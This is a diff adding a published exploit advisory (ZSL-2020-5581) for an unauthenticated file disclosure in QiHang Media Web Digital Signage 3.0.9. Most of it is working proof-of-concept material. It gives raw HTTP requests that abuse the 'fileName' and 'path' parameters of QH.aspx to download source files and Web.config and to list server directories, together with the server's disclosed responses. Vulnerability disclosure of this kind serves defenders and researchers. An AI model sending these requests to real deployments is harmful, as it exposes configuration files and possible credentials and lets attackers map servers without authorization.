@@ -1,0 +1,222 @@
+# Exploit Title: QiHang Media Web Digital Signage 3.0.9 - Unauthenticated Arbitrary File Disclosure
+# Date: 2020-08-12
+# Exploit Author: LiquidWorm
+# Vendor Homepage: http://www.howfor.com
+# Tested on: Microsoft Windows Server 2012 R2 Datacenter
+# CVE : N/A
+
+QiHang Media Web (QH.aspx) Digital Signage 3.0.9 Arbitrary File Disclosure Vulnerability
+
+
+Vendor: Shenzhen Xingmeng Qihang Media Co., Ltd.
+        Guangzhou Hefeng Automation Technology Co., Ltd.
+Product web page: http://www.howfor.com
+Affected version: 3.0.9.0
+
+Summary: Digital Signage Software.
+
+Desc: The application suffers from an unauthenticated file disclosure
+vulnerability when input passed thru the 'filename' parameter when
+using the download action or thru 'path' parameter when using the
+getAll action is not properly verified before being used. This can
+be exploited to disclose contents of files and directories from local
+resources.
+
+Tested on: Microsoft Windows Server 2012 R2 Datacenter
+           Microsoft Windows Server 2003 Enterprise Edition
+           ASP.NET 4.0.30319
+           HowFor Web Server/5.6.0.0
+           Microsoft ASP.NET Web QiHang IIS Server
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2020-5581
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5581.php
+
+
+27.07.2020
+
+--
+
+
+Source code disclosure PoC:
+---------------------------
+
+GET /QH.aspx?responderId=ResourceNewResponder&action=download&fileName=.%2fQH.aspx HTTP/1.1
+Host: 192.168.1.74:8090
+User-Agent: lfi_test.wrapper/2.9
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+--
+
+HTTP/1.1 200 OK
+Server: HowFor Web Server/5.6.0.0
+Date: Sun, 26 Jul 2020 22:49:08 GMT
+X-AspNet-Version: 4.0.30319
+Content-Disposition: attachment;filename=QH.aspx
+Set-Cookie: ASP.NET_SessionId=f0xji5cazmbzdygcr5g3qr03; path=/; HttpOnly
+Cache-Control: no-cache
+Pragma: no-cache
+Expires: -1
+Content-Type: application/zip
+Content-Length: 463
+Connection: Close
+
+<%@ Page Language="C#" ValidateRequest="false" AutoEventWireup="true" CodeBehind="QH.aspx.cs" Inherits="QiHang.Media.Web.QH" %>
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head runat="server">
+    <title></title>
+</head>
+<body>
+    <form id="form1" runat="server">
+    <div>
+    
+    </div>
+    </form>
+</body>
+</html>
+
+
+Arbitrary file read:
+--------------------
+
+http://192.168.1.74:8090/QH.aspx?responderId=ResourceNewResponder&action=download&fileName=.%2fGlobal.asax
+http://192.168.1.74:8090/QH.aspx?responderId=ResourceNewResponder&action=view&fileName=.%2fWeb.config
+
+
+Directory contents disclosure:
+------------------------------
+
+POST /QH.aspx HTTP/1.1
+Host: 192.168.1.74:8090
+Content-Length: 62
+User-Agent: lfi_test.wrapper/2.9
+X-Requested-With: XMLHttpRequest
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+responderId=ResourceNewResponder&action=getAll&path=&fileName=
+
+--
+
+HTTP/1.1 200 OK
+Server: HowFor Web Server/5.6.0.0
+Date: Tue, 28 Jul 2020 23:51:13 GMT
+X-AspNet-Version: 4.0.30319
+Set-Cookie: ASP.NET_SessionId=f0ac1jyifcacvufnpptduv1f; path=/; HttpOnly
+Cache-Control: no-cache
+Pragma: no-cache
+Expires: -1
+Content-Type: text/html; charset=utf-8
+Content-Length: 4680
+Connection: Close
+
+{
+  "first": true,
+  "second": [
+    {
+      "name": "App_Data",
+      "type": "folder",
+      "size": 852992.0,
+      "uploadTime": new Date(
+        1525316885250
+      ),
+      "path": "/App_Data"
+    },
+    {
+      "name": "bin",
+      "type": "folder",
+      "size": 4398172.0,
+      "uploadTime": new Date(
+        1525316885046
+      ),
+...
+...
+      "name": "xml",
+      "type": "folder",
+      "size": 25519.0,
+      "uploadTime": new Date(
+        1525316885234
+      ),
+      "path": "/xml"
+    },
+    {
+      "name": "default.htm",
+      "type": ".htm",
+      "size": 1609.0,
+      "uploadTime": new Date(
+        1523859040000
+      ),
+      "path": "/default.htm"
+    },
+    {
+      "name": "Global.asax",
+      "type": ".asax",
+      "size": 100.0,
+      "uploadTime": new Date(
+        1523859032000
+      ),
+      "path": "/Global.asax"
+    },
+    {
+      "name": "IIS.dll",
+      "type": ".dll",
+      "size": 40960.0,
+      "uploadTime": new Date(
+        1523859036000
+      ),
+...
+...
+      "path": "/Media.Server.DeamonPlugin.Web.xml"
+    },
+    {
+      "name": "preview.htm",
+      "type": ".htm",
+      "size": 947.0,
+      "uploadTime": new Date(
+        1523859040000
+      ),
+      "path": "/preview.htm"
+    },
+    {
+      "name": "QH.aspx",
+      "type": ".aspx",
+      "size": 463.0,
+      "uploadTime": new Date(
+        1523859030000
+      ),
+      "path": "/QH.aspx"
+    },
+    {
+      "name": "server.xml",
+      "type": ".xml",
+      "size": 206.0,
+      "uploadTime": new Date(
+        1523859034000
+      ),
+      "path": "/server.xml"
+    },
+    {
+      "name": "Web.config",
+      "type": ".config",
+      "size": 2470.0,
+      "uploadTime": new Date(
+        1523859034000
+      ),
+      "path": "/Web.config"
+    }
+  ],
+  "third": 0
+}
